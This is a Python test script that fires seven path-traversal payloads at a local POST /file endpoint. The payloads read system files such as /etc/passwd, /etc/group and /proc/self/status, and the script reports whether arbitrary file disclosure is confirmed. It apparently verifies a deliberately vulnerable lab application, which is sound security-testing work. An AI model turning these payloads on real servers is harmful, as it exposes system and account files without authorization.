#!/usr/bin/env python3
"""
Path Traversal (Local File Inclusion) Test Script
Tests 7 payloads against POST /file endpoint
Target: Arbitrary file reading via unsanitized file paths
"""

import requests
import json
import sys
import time

BASE_URL = "http://localhost:5000"
DELAY = 1.5

PAYLOADS = [
    {
        "id": 1,
        "filename": "/etc/passwd",
        "description": "Read user accounts file",
        "expected_content": "root:x:0:0",
    },
    {
        "id": 2,
        "filename": "/etc/hosts",
        "description": "Read host mappings file",
        "expected_content": "127.0.0.1",
    },
    {
        "id": 3,
        "filename": "/etc/group",
        "description": "Read group information file",
        "expected_content": "root:x:0",
    },
    {
        "id": 4,
        "filename": "/proc/version",
        "description": "Read kernel version via procfs",
        "expected_content": "Linux",
    },
    {
        "id": 5,
        "filename": "/etc/lsb-release",
        "description": "Read OS release information",
        "expected_content": "Ubuntu",
    },
    {
        "id": 6,
        "filename": "/proc/self/status",
        "description": "Read current process status via procfs",
        "expected_content": "Name:",
    },
    {
        "id": 7,
        "filename": "/etc/resolv.conf",
        "description": "Read DNS resolver configuration",
        "expected_content": "nameserver",
    },
]

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def test_payload(payload):
    """Test a single path traversal payload"""
    try:
        response = requests.post(
            f"{BASE_URL}/file",
            data={"filename": payload["filename"]},
            timeout=30,
        )

        data = response.json()

        passed = False
        result_detail = ""

        if data.get("status") == "success":
            content = data.get("content", "")
            file_size = data.get("size", 0)

            if payload["expected_content"] in content:
                passed = True
                preview = content.strip()[:100].replace("\n", " | ")
                result_detail = f"Found '{payload['expected_content']}' ({file_size} bytes)"
                result_detail += f"\n    Preview: {preview}..."
            else:
                result_detail = f"'{payload['expected_content']}' not found in content"
        else:
            result_detail = f"Server error: {data.get('message', 'Unknown')}"

        return {
            "id": payload["id"],
            "description": payload["description"],
            "filename": payload["filename"],
            "status_code": response.status_code,
            "passed": passed,
            "detail": result_detail,
        }

    except requests.exceptions.RequestException as e:
        return {
            "id": payload["id"],
            "description": payload["description"],
            "filename": payload["filename"],
            "status_code": 0,
            "passed": False,
            "detail": str(e),
        }


def print_report(results):
    """Print test results summary"""
    print("\n" + "=" * 70)
    print(f"{BOLD}Path Traversal Test Results - POST /file{RESET}")
    print("=" * 70)

    passed_count = 0

    for r in results:
        status = f"{GREEN}PASS{RESET}" if r["passed"] else f"{RED}FAIL{RESET}"
        if r["passed"]:
            passed_count += 1

        print(f"\n  {BOLD}[{status}]{RESET} Payload #{r['id']}: {r['description']}")
        print(f"    Target: {r['filename']}")
        print(f"    Response: HTTP {r['status_code']}")
        print(f"    {r['detail']}")

    print("\n" + "-" * 70)
    print(f"{BOLD}Summary: {passed_count}/{len(results)} payloads passed{RESET}")
    if passed_count == len(results):
        print(f"{GREEN}All files read successfully. Arbitrary file disclosure confirmed.{RESET}")
    elif passed_count > 0:
        print(f"{YELLOW}Some files were read. Endpoint is vulnerable to path traversal.{RESET}")
    else:
        print(f"{RED}No files were read successfully.{RESET}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    print(f"{BOLD}[*] Starting Path Traversal tests against {BASE_URL}/file{RESET}")
    print(f"[*] Testing {len(PAYLOADS)} payloads...\n")

    results = []
    for p in PAYLOADS:
        r = test_payload(p)
        results.append(r)
        time.sleep(DELAY)
    print_report(results)

    sys.exit(0 if any(r["passed"] for r in results) else 1)
